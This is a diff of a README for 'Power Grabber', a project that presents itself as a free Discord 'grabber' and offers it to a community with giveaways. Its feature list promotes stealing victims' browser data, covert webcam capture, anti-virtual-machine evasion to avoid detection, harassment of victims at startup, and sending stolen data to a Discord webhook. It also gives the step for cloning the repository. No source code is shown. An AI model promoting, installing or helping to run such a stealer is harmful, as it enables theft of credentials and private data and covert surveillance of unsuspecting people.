@@ -2,14 +2,20 @@
 <p align="center">
     <img src="https://socialify.git.ci/Powercascade/Power-grabber/image?font=Raleway&amp;language=1&amp;name=1&amp;owner=1&amp;pattern=Circuit+Board&amp;stargazers=1&amp;theme=Dark" alt="Power Grabber Project">
 </p>
+
 <p align="center">
     <img src="https://cdn.discordapp.com/attachments/1327037215062360176/1328147742475681904/FA6FD31E-7EB8-4399-80C9-A9CFD006DA2B.png?ex=6785a579&is=678453f9&hm=20a5fe206c496a7b5394d77b019f15efaebe175c3490af31398ffb487a95a966&" alt="Power Grabber Screenshot" width="1000" height="600" />
 </p>
+
 ## <h2>🚀 Description</h2>
 **Power Grabber** is a free, open-source Discord grabber. The grabber provides multiple utilities for data extraction. We also host **bimonthly premium giveaways** for our community.
+
 ---
+
 ## <h2>🧐 Features</h2>
+
 Here are some of the most notable features that **Power Grabber** offers:
+
 - 🔒 **Anti-Virtual Machine Protection** - Prevents detection in virtual machines.
 - 😈 **Annoy Victim** - Annoys the victim when they turn on their computer.
 - 🌐 **Browser Info Grabber** - Steals sensitive browser data.
@@ -33,14 +39,10 @@ Here are some of the most notable features that **Power Grabber** offers:
 - 📷 **Webcam Access** - Takes pictures from the victim’s webcam.
 - 💾 **File Pumper** - Modifies files to increase size.
 - 📡 **Ping** - Pings a selected option from the Discord webhook.
+
 ---
 
 ## <h2>📦 Installation</h2>
-
-1. Clone this repository:
-   ```bash
-   git clone https://github.com/Powercascade/Power-grabber.git
-   ```
 1. Windows
 
     1. Clone this repository:
